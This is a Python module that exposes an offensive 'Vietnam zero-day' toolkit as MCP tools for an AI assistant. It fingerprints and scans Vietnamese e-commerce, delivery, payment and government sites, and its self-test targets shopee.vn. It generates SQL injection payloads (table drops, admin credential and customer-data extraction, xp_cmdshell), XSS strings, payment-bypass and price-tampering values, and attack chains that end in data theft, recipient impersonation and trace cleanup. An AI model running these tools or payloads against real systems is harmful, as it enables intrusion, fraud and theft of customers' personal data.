#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
越南零日漏洞挖掘MCP集成模块
Vietnam Zero-Day Vulnerability Discovery MCP Integration

将越南零日漏洞挖掘工具集成到MCP服务器
提供统一的API接口供Claude调用

功能模块:
- 越南系统指纹识别
- 零日漏洞扫描
- 业务逻辑检测
- 载荷自动生成
- 漏洞利用链生成
- 报告自动生成
"""

import asyncio
import json
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime
import subprocess
import sys
import os

# 导入我们的模块
from vietnam_fingerprint_recognizer import VietnamFingerprintRecognizer
from vietnam_business_logic_detector import VietnamBusinessLogicDetector
from VIETNAM_ZERO_DAY_MCP_SERVER import VietnamZeroDayMCP

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('vietnam_mcp_integration.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("vietnam_mcp_integration")

class VietnamZeroDayMCPIntegration:
    """越南零日漏洞挖掘MCP集成器"""

    def __init__(self):
        self.fingerprint_recognizer = VietnamFingerprintRecognizer()
        self.business_logic_detector = VietnamBusinessLogicDetector()
        self.zero_day_scanner = VietnamZeroDayMCP()
        self.scan_results = {}
        self.initialized = False

    async def initialize(self):
        """初始化所有组件"""
        if self.initialized:
            return

        logger.info("🚀 初始化越南零日漏洞挖掘MCP集成系统...")

        await self.business_logic_detector.initialize()
        await self.zero_day_scanner.initialize()

        self.initialized = True
        logger.info("✅ 越南零日MCP集成系统初始化完成")

    # MCP工具函数定义

    async def mcp_vietnam_identify_target(self, url: str) -> str:
        """识别越南目标系统"""
        await self._ensure_initialized()

        logger.info(f"🔍 MCP调用: 识别越南目标 {url}")

        try:
            fingerprint = self.fingerprint_recognizer.identify_system(url)

            if fingerprint:
                result = {
                    "success": True,
                    "system_info": {
                        "name": fingerprint.system_name,
                        "category": fingerprint.category.value,
                        "confidence": f"{fingerprint.confidence:.2%}",
                        "vietnam_specific": fingerprint.vietnam_specific,
                        "description": fingerprint.description
                    },
                    "vulnerability_recommendations": self.fingerprint_recognizer.get_vulnerability_recommendations(fingerprint),
                    "scan_id": f"VN-ID-{int(datetime.now().timestamp())}"
                }
            else:
                result = {
                    "success": False,
                    "error": "未识别到越南系统",
                    "suggestion": "请确认目标是否为越南快递、物流、电商或支付系统",
                    "scan_id": f"VN-ID-{int(datetime.now().timestamp())}"
                }

            return json.dumps(result, ensure_ascii=False, indent=2)

        except Exception as e:
            logger.error(f"目标识别失败: {e}")
            return json.dumps({
                "success": False,
                "error": f"识别失败: {str(e)}"
            }, ensure_ascii=False)

    async def mcp_vietnam_comprehensive_scan(self, url: str, scan_type: str = "full") -> str:
        """综合扫描越南目标"""
        await self._ensure_initialized()

        scan_id = f"VN-SCAN-{int(datetime.now().timestamp())}"
        logger.info(f"🔍 MCP调用: 综合扫描 {url} (类型: {scan_type}, ID: {scan_id})")

        try:
            # 1. 目标识别
            fingerprint = self.fingerprint_recognizer.identify_system(url)

            if not fingerprint:
                return json.dumps({
                    "success": False,
                    "error": "未识别到越南系统，无法进行专门扫描",
                    "scan_id": scan_id
                }, ensure_ascii=False)

            # 2. 确定扫描类型
            system_type = fingerprint.category.value

            # 3. 执行扫描
            scan_results = {
                "scan_id": scan_id,
                "target_info": {
                    "url": url,
                    "system_name": fingerprint.system_name,
                    "system_type": system_type,
                    "confidence": f"{fingerprint.confidence:.2%}"
                },
                "scan_start": datetime.now().isoformat(),
                "vulnerabilities": []
            }

            # 4. 零日漏洞扫描
            if scan_type in ["full", "zero_day"]:
                logger.info("  🔍 执行零日漏洞扫描...")
                zero_day_vulns = await self.zero_day_scanner.scan_for_zero_day_vulnerabilities(
                    self._convert_fingerprint_to_target(fingerprint)
                )

                for vuln in zero_day_vulns:
                    scan_results["vulnerabilities"].append({
                        "type": "zero_day",
                        "category": vuln.vuln_type.value,
                        "severity": vuln.severity,
                        "description": vuln.description,
                        "vietnam_context": vuln.vietnam_context,
                        "payload": vuln.payload,
                        "exploitation_path": vuln.exploitation_path
                    })

            # 5. 业务逻辑漏洞检测
            if scan_type in ["full", "business_logic"]:
                logger.info("  🔍 执行业务逻辑漏洞检测...")
                business_vulns = await self.business_logic_detector.detect_business_logic_vulnerabilities(
                    url, system_type
                )

                for vuln in business_vulns:
                    scan_results["vulnerabilities"].append({
                        "type": "business_logic",
                        "category": vuln.vuln_type.value,
                        "severity": vuln.severity,
                        "description": vuln.description,
                        "vietnam_context": vuln.vietnam_context,
                        "test_payload": vuln.test_payload,
                        "exploitation_steps": vuln.exploitation_steps
                    })

            # 6. 生成总结
            scan_results["scan_end"] = datetime.now().isoformat()
            scan_results["total_vulnerabilities"] = len(scan_results["vulnerabilities"])
            scan_results["critical_count"] = len([v for v in scan_results["vulnerabilities"] if v["severity"] == "Critical"])
            scan_results["high_count"] = len([v for v in scan_results["vulnerabilities"] if v["severity"] == "High"])

            # 保存结果
            self.scan_results[scan_id] = scan_results

            return json.dumps({
                "success": True,
                "scan_results": scan_results
            }, ensure_ascii=False, indent=2)

        except Exception as e:
            logger.error(f"综合扫描失败: {e}")
            return json.dumps({
                "success": False,
                "error": f"扫描失败: {str(e)}",
                "scan_id": scan_id
            }, ensure_ascii=False)

    async def mcp_vietnam_generate_payload(self, system_type: str, vuln_type: str, context: str = "") -> str:
        """生成越南系统专用载荷"""
        await self._ensure_initialized()

        logger.info(f"🔧 MCP调用: 生成载荷 (系统: {system_type}, 漏洞: {vuln_type})")

        try:
            payloads = []

            # 根据系统类型和漏洞类型生成载荷
            if vuln_type.lower() == "sql_injection":
                payloads = self._generate_sql_payloads(system_type)
            elif vuln_type.lower() == "xss":
                payloads = self._generate_xss_payloads(system_type)
            elif vuln_type.lower() == "price_manipulation":
                payloads = self._generate_price_payloads(system_type)
            elif vuln_type.lower() == "shipping_bypass":
                payloads = self._generate_shipping_payloads(system_type)
            elif vuln_type.lower() == "coupon_abuse":
                payloads = self._generate_coupon_payloads(system_type)
            elif vuln_type.lower() == "payment_bypass":
                payloads = self._generate_payment_payloads(system_type)
            else:
                payloads = self._generate_generic_payloads(system_type, vuln_type)

            result = {
                "success": True,
                "system_type": system_type,
                "vulnerability_type": vuln_type,
                "context": context,
                "vietnam_specific_payloads": payloads,
                "generated_at": datetime.now().isoformat(),
                "usage_notes": [
                    "这些载荷专门针对越南系统设计",
                    "请在授权测试环境中使用",
                    "部分载荷可能需要根据具体系统调整"
                ]
            }

            return json.dumps(result, ensure_ascii=False, indent=2)

        except Exception as e:
            logger.error(f"载荷生成失败: {e}")
            return json.dumps({
                "success": False,
                "error": f"载荷生成失败: {str(e)}"
            }, ensure_ascii=False)

    async def mcp_vietnam_generate_exploitation_chain(self, target_info: Dict[str, Any]) -> str:
        """生成越南系统漏洞利用链"""
        await self._ensure_initialized()

        logger.info(f"⛓️ MCP调用: 生成利用链")

        try:
            system_name = target_info.get("system_name", "unknown")
            system_type = target_info.get("system_type", "unknown")

            # 基于系统类型生成利用链
            exploitation_chains = self._generate_system_specific_chains(system_type, system_name)

            result = {
                "success": True,
                "target_info": target_info,
                "exploitation_chains": exploitation_chains,
                "generated_at": datetime.now().isoformat(),
                "vietnam_context": f"针对{system_name}的专门利用链"
            }

            return json.dumps(result, ensure_ascii=False, indent=2)

        except Exception as e:
            logger.error(f"利用链生成失败: {e}")
            return json.dumps({
                "success": False,
                "error": f"利用链生成失败: {str(e)}"
            }, ensure_ascii=False)

    async def mcp_vietnam_get_scan_report(self, scan_id: str) -> str:
        """获取扫描报告"""
        if scan_id not in self.scan_results:
            return json.dumps({
                "success": False,
                "error": f"扫描ID {scan_id} 不存在"
            }, ensure_ascii=False)

        scan_result = self.scan_results[scan_id]

        # 生成详细报告
        report = {
            "success": True,
            "scan_id": scan_id,
            "executive_summary": {
                "target": scan_result["target_info"]["url"],
                "system": scan_result["target_info"]["system_name"],
                "scan_date": scan_result["scan_start"],
                "total_vulnerabilities": scan_result["total_vulnerabilities"],
                "critical_issues": scan_result["critical_count"],
                "high_risk_issues": scan_result["high_count"]
            },
            "vulnerability_details": scan_result["vulnerabilities"],
            "recommendations": self._generate_recommendations(scan_result["vulnerabilities"]),
            "next_steps": [
                "验证发现的漏洞",
                "评估业务影响",
                "制定修复计划",
                "进行复测验证"
            ]
        }

        return json.dumps(report, ensure_ascii=False, indent=2)

    async def mcp_vietnam_list_supported_systems(self) -> str:
        """列出支持的越南系统"""
        try:
            supported_systems = []

            for system_name, fingerprint in self.fingerprint_recognizer.fingerprints.items():
                supported_systems.append({
                    "system_id": system_name,
                    "name": fingerprint.system_name,
                    "category": fingerprint.category.value,
                    "vietnam_specific": fingerprint.vietnam_specific,
                    "description": fingerprint.description,
                    "common_vulnerabilities": fingerprint.common_vulnerabilities
                })

            result = {
                "success": True,
                "total_supported": len(supported_systems),
                "supported_systems": supported_systems,
                "categories": {
                    "express_delivery": "快递配送",
                    "ecommerce": "电子商务",
                    "logistics": "物流管理",
                    "payment": "支付系统",
                    "government": "政府系统"
                }
            }

            return json.dumps(result, ensure_ascii=False, indent=2)

        except Exception as e:
            logger.error(f"获取支持系统列表失败: {e}")
            return json.dumps({
                "success": False,
                "error": f"获取失败: {str(e)}"
            }, ensure_ascii=False)

    # 辅助方法

    async def _ensure_initialized(self):
        """确保已初始化"""
        if not self.initialized:
            await self.initialize()

    def _convert_fingerprint_to_target(self, fingerprint):
        """转换指纹为目标对象"""
        from VIETNAM_ZERO_DAY_MCP_SERVER import VietnamTarget, TargetType

        type_mapping = {
            "express_delivery": TargetType.EXPRESS_DELIVERY,
            "ecommerce": TargetType.ECOMMERCE,
            "logistics": TargetType.LOGISTICS,
            "payment": TargetType.PAYMENT_GATEWAY
        }

        return VietnamTarget(
            url="",  # 这里需要从外部传入
            target_type=type_mapping.get(fingerprint.category.value, TargetType.LOGISTICS),
            company_name=fingerprint.system_name,
            description=fingerprint.description,
            technologies=[],  # 可以从指纹中提取
            vietnam_specific=fingerprint.vietnam_specific
        )

    def _generate_sql_payloads(self, system_type: str) -> List[Dict[str, Any]]:
        """生成SQL注入载荷"""
        base_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT @@version --",
            "' UNION SELECT username,password FROM admin --",
            "'; EXEC xp_cmdshell('dir'); --"
        ]

        vietnam_specific = [
            "' OR '1'='1' AND ten_khach_hang LIKE '%nguyen%'",
            "' UNION SELECT ten,so_dien_thoai FROM khach_hang --",
            "' AND dia_chi LIKE '%Hà Nội%'",
            "'; UPDATE don_hang SET trang_thai='delivered' --"
        ]

        return [
            {"payload": payload, "description": desc, "vietnam_specific": i >= len(base_payloads)}
            for i, (payload, desc) in enumerate(zip(
                base_payloads + vietnam_specific,
                ["基础SQL注入", "删除表", "获取版本", "提取管理员数据", "命令执行"] +
                ["越南客户数据", "越南订单数据", "越南地址过滤", "越南订单状态"]
            ))
        ]

    def _generate_xss_payloads(self, system_type: str) -> List[Dict[str, Any]]:
        """生成XSS载荷"""
        payloads = [
            {"payload": "<script>alert('XSS-VN')</script>", "description": "基础XSS"},
            {"payload": "<img src=x onerror=alert('Vietnam-XSS')>", "description": "图片XSS"},
            {"payload": "javascript:alert('VN-Security')", "description": "JavaScript协议"},
            {"payload": "<svg onload=alert('🇻🇳-XSS')>", "description": "SVG XSS"},
            {"payload": "';alert('Vietnamese-Input');//", "description": "输入框XSS"}
        ]

        return payloads

    def _generate_price_payloads(self, system_type: str) -> List[Dict[str, Any]]:
        """生成价格操纵载荷"""
        return [
            {"payload": {"price": 0, "quantity": 1}, "description": "零价格攻击"},
            {"payload": {"price": -1000, "discount": 100}, "description": "负价格攻击"},
            {"payload": {"total_amount": 1000, "calculated_total": 1000000}, "description": "总价替换"},
            {"payload": {"discount_code": "VN-HACK-100", "discount": 100}, "description": "越南折扣码"}
        ]

    def _generate_shipping_payloads(self, system_type: str) -> List[Dict[str, Any]]:
        """生成运费绕过载荷"""
        return [
            {"payload": {"weight": 0, "distance": 100}, "description": "零重量绕过"},
            {"payload": {"shipping_fee": 0, "express": True}, "description": "免费快递"},
            {"payload": {"remote_area": False, "address": "Lào Cai"}, "description": "偏远地区绕过"}
        ]

    def _generate_coupon_payloads(self, system_type: str) -> List[Dict[str, Any]]:
        """生成优惠券滥用载荷"""
        return [
            {"payload": {"coupons": ["WELCOME10", "SALE20", "VIP30"]}, "description": "优惠券堆叠"},
            {"payload": {"coupon_code": "VIETNAM2024", "bypass": True}, "description": "越南特殊优惠券"},
            {"payload": {"discount_percentage": 100, "max_discount": 999999}, "description": "100%折扣"}
        ]

    def _generate_payment_payloads(self, system_type: str) -> List[Dict[str, Any]]:
        """生成支付绕过载荷"""
        return [
            {"payload": {"payment_status": "paid", "amount": 0}, "description": "零支付"},
            {"payload": {"transaction_id": "FAKE-VN-123", "verified": True}, "description": "假交易ID"},
            {"payload": {"payment_method": "VNPAY", "bypass": True}, "description": "VNPay绕过"}
        ]

    def _generate_generic_payloads(self, system_type: str, vuln_type: str) -> List[Dict[str, Any]]:
        """生成通用载荷"""
        return [
            {"payload": f"{vuln_type}_payload_vn", "description": f"越南{vuln_type}载荷"}
        ]

    def _generate_system_specific_chains(self, system_type: str, system_name: str) -> List[Dict[str, Any]]:
        """生成系统特定利用链"""

        if system_type == "ecommerce":
            return [
                {
                    "chain_name": "电商订单操纵链",
                    "steps": [
                        "1. 识别电商平台技术栈",
                        "2. 发现价格计算API",
                        "3. 利用价格操纵漏洞",
                        "4. 绕过支付验证",
                        "5. 获取低价商品",
                        "6. 清理攻击痕迹"
                    ],
                    "vietnam_context": f"专门针对{system_name}越南站的订单流程"
                },
                {
                    "chain_name": "优惠券滥用链",
                    "steps": [
                        "1. 收集越南用户优惠券",
                        "2. 分析优惠券验证逻辑",
                        "3. 绕过使用限制",
                        "4. 堆叠多个优惠券",
                        "5. 获得巨额折扣",
                        "6. 完成订单支付"
                    ]
                }
            ]

        elif system_type == "express_delivery":
            return [
                {
                    "chain_name": "快递系统攻击链",
                    "steps": [
                        "1. 识别快递公司系统",
                        "2. 枚举API端点",
                        "3. 利用跟踪系统漏洞",
                        "4. 篡改配送状态",
                        "5. 获取包裹信息",
                        "6. 冒充收件人"
                    ],
                    "vietnam_context": f"针对{system_name}越南快递系统的攻击流程"
                }
            ]

        else:
            return [
                {
                    "chain_name": "通用攻击链",
                    "steps": [
                        "1. 信息收集",
                        "2. 漏洞发现",
                        "3. 漏洞利用",
                        "4. 权限提升",
                        "5. 数据窃取",
                        "6. 清理痕迹"
                    ]
                }
            ]

    def _generate_recommendations(self, vulnerabilities: List[Dict[str, Any]]) -> List[str]:
        """生成修复建议"""
        recommendations = []

        for vuln in vulnerabilities:
            if vuln["severity"] == "Critical":
                recommendations.append(f"🚨 立即修复 {vuln['category']} 漏洞")
            elif vuln["severity"] == "High":
                recommendations.append(f"⚠️ 优先修复 {vuln['category']} 漏洞")

        # 添加越南特定建议
        recommendations.extend([
            "🇻🇳 加强越南本地化安全控制",
            "🔍 实施专门的越南业务逻辑验证",
            "📊 建立越南用户行为监控",
            "🛡️ 部署针对越南地区的防护措施"
        ])

        return list(set(recommendations))  # 去重

    async def cleanup(self):
        """清理资源"""
        if self.initialized:
            await self.business_logic_detector.cleanup()
            await self.zero_day_scanner.cleanup()
            self.initialized = False
        logger.info("🧹 越南零日MCP集成器已清理")

# MCP服务器注册函数
def register_mcp_tools():
    """注册MCP工具"""
    return {
        "vietnam_identify_target": {
            "description": "识别越南目标系统",
            "parameters": {
                "url": {"type": "string", "description": "目标URL"}
            }
        },
        "vietnam_comprehensive_scan": {
            "description": "综合扫描越南目标",
            "parameters": {
                "url": {"type": "string", "description": "目标URL"},
                "scan_type": {"type": "string", "description": "扫描类型: full, zero_day, business_logic"}
            }
        },
        "vietnam_generate_payload": {
            "description": "生成越南系统专用载荷",
            "parameters": {
                "system_type": {"type": "string", "description": "系统类型"},
                "vuln_type": {"type": "string", "description": "漏洞类型"},
                "context": {"type": "string", "description": "上下文信息"}
            }
        },
        "vietnam_generate_exploitation_chain": {
            "description": "生成越南系统漏洞利用链",
            "parameters": {
                "target_info": {"type": "object", "description": "目标信息"}
            }
        },
        "vietnam_get_scan_report": {
            "description": "获取扫描报告",
            "parameters": {
                "scan_id": {"type": "string", "description": "扫描ID"}
            }
        },
        "vietnam_list_supported_systems": {
            "description": "列出支持的越南系统",
            "parameters": {}
        }
    }

# 主程序入口
if __name__ == "__main__":
    async def main():
        print("🇻🇳 越南零日漏洞挖掘MCP集成系统")
        print("🔗 为Claude提供越南系统渗透测试工具")
        print("=" * 50)

        integration = VietnamZeroDayMCPIntegration()
        await integration.initialize()

        try:
            # 测试功能
            print("\n🔍 测试目标识别...")
            result = await integration.mcp_vietnam_identify_target("https://shopee.vn")
            print("✅ 目标识别测试完成")

            print("\n🔧 测试载荷生成...")
            result = await integration.mcp_vietnam_generate_payload("ecommerce", "sql_injection")
            print("✅ 载荷生成测试完成")

            print("\n📋 测试支持系统列表...")
            result = await integration.mcp_vietnam_list_supported_systems()
            print("✅ 系统列表测试完成")

            print("\n🎯 越南零日MCP集成系统就绪!")
            print("📝 可用的MCP工具:")
            tools = register_mcp_tools()
            for tool_name, tool_info in tools.items():
                print(f"   • {tool_name}: {tool_info['description']}")

        finally:
            await integration.cleanup()

    asyncio.run(main())